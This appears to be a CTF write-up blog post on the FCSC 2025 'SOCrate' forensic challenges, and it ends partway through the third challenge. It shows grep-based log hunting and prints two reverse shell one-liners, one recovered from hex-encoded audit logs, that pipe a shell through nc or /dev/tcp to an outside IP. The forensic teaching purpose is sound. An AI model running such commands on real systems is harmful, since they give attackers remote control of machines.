---
title: "🔍 SOCrate"
date: 2025-04-26T22:02:00+01:00
tags: ["CTF","Writeups","FCSC 2025","🔍 Forensic"]
author: "Sirius14"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "FCSC 2025 series of forensic challenges"
summary:  "FCSC 2025 series of forensic challenges"
disableHLJS: false # to disable highlightjs
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: false
ShowPostNavLinks: false
ShowWordCount: false
ShowRssButtonInSectionTermList: false
UseHugoToc: true
pygmentsUseClasses: true
pygmentsCodeFences: true
---

En juin 2023, un opérateur d'importance vitale est victime d'une attaque compromettant tout son système d'information. Vous avez reçu les logs Linux et Windows et vous devez répondre aux questions des enquêteurs.

# SOCrate 1/6 - Technologie (intro)

Sur la machine webserver, sous quel chemin tourne l'application web ?
Format du flag : FCSC{/var/www/\*\*\*/************/}

## An easy one

We have two folders at our disposal:
- Linux logs
- Windows evtx

There’s a ton of logs — about 10 GB in total!
For this first challenge, let’s keep it simple. We’ll start by using a grep command on the Linux folder, searching for `/var/www/`.

```sh
grep -a -i -r 'webserver' | grep '/var/www/'
```

![grep /var/www](/Sirius14_Blog/img/writeups/socrate_1.png)

Flag was: __FCSC{/var/www/app/banque_paouf/}__

# SOCrate 2/6 - Reverse shell ⭐⭐

L'attaquant a exécuté un reverse shell sur une machine. Retrouver la commande correspondant à l'exécution de ce reverse shell.
Exemple : FCSC{bash -i >& /dev/tcp/10.42.43.44/1234 0>&1}

## Basic revshell

We’re looking for a reverse shell, and there’s a high probability that the attacker is trying to hide the command.
But first, let’s check the usage of the /tmp folder. This directory is commonly used by attackers to store temporary files, scripts, or reverse shell payloads.

We can start by running a simple grep command on the logs to search for suspicious activity related to `/tmp`. It might give us a clue on where to dig deeper.

![grep /tmp](/Sirius14_Blog/img/writeups/socrate_2.png)

It’s definitely weird. The usage of /tmp/f and mkfifo looks suspicious — like a reverse shell payload.
When we open the `20230613T084001.log` file and examine the `/tmp/f` entry, we can retrieve a request just above that might give us more insight.

```
node=webserver type=EXECVE msg=audit(1686645535.854:2903): argc=3 a0="/bin/bash" a1="-c" a2=726D202F746D702F663B6D6B6669666F202F746D702F663B636174202F746D702F667C2F62696E2F7368202D6920323E26317C6E632038302E3132352E392E3538203530303132203E2F746D702F66
```

Decoding this from hex and we obtain: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50012 >/tmp/f`

Flag was __FCSC{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50012 >/tmp/f}__

# SOCrate 3/6 - Outil téléchargé ⭐⭐

L'attaquant a utilisé le reverse shell de la question 2 pour télécharger un outil. Il a ensuite exécuté cet outil.
Retrouver l'URL du téléchargement et retrouver le nom original de l'outil (le binaire ayant été renommé).
Format du flag : FCSC{URL|NOM_ORIGINAL}

## Grep the strong !

So now, we need to find the URL that allowed the tool to be downloaded. Let’s grep for that!

![grep http://](/Sirius14_Blog/img/writeups/socrate_3.png)

Seems we found the url, let's check the logs 